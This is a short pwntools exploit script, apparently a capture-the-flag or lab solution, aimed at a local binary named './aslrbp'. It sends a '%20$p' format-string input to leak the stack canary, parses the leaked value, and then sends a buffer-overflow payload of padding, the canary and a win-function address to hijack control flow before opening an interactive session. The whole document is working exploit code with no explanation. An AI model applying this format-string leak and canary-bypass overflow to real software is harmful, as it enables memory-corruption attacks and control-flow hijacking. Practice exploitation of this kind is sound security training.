from pwn import *

p = process(["./aslrbp", "./1"])
win_func = 0x1000004b8

p.sendline(b"%20$p")
canary_data = p.recvuntil(b"Input2: \n")
body = canary_data[:-len(b"Input2: \n")]
tokens = body.split()
leak_hex = tokens[-1]
canary = int(leak_hex, 16)
canary = canary
print(f"\n\nDEBUG: {canary}\n")

payload = b"A"*0x80 + p64(canary) + b"A"*8 + p64(win_func)

p.sendline(payload)
p.interactive()
